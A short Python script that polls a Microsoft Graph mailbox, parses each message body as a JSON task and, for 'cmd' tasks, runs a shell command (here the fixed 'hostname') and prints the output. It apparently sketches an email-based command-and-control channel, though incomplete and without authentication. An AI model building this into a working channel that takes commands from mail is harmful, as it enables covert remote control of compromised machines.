import json
import requests
import subprocess

mail = "https://graph.microsoft.com/v1.0/me/messages"
for message in requests.get(mail).json()["value"]:
    task = json.loads(message["body"]["content"])
    if task["command_type"] == "cmd":
        output = subprocess.check_output("hostname", shell=True)
        print(task, output)
